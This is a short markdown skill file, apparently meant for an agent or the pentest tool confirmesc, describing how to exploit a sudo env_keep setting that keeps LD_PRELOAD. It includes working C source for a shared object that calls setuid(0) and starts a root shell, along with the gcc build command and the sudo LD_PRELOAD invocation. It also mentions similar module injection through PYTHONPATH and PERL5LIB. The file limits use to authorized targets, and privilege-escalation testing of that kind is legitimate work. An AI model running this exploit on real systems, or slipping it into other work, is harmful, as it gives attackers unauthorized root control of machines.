---
name: sudo-env-keep
description: Exploit a CONFIRMED sudo env_keep setting that preserves LD_PRELOAD or a similar loader variable into a sudo-run command.
---

# sudo env_keep (LD_PRELOAD)

If sudoers keeps `LD_PRELOAD` (or `LD_LIBRARY_PATH`, `PYTHONPATH`, `PERL5LIB`)
across sudo, you can load your own code into a command you are allowed to run as
root.

## When to use

confirmesc reports a finding like:

```
[CONFIRMED] sudo env_keep preserves LD_PRELOAD
```

## How to exploit (LD_PRELOAD)

Compile a small shared object whose constructor becomes root and spawns a shell:

```c
#include <stdlib.h>
#include <unistd.h>
void _init(void){ setgid(0); setuid(0); system("/bin/bash -p"); }
```

```bash
gcc -shared -fPIC -nostartfiles -o /tmp/x.so x.c
sudo LD_PRELOAD=/tmp/x.so <an allowed command>
```

- The interpreter path variables (`PYTHONPATH`, `PERL5LIB`) have analogous
  module-injection techniques.

## Verify

The spawned shell runs `id` as root.

## Rules

- Authorized targets only. This writes a shared object to disk; remove it
  afterwards. confirmesc keeps this finding condition-only for that reason.
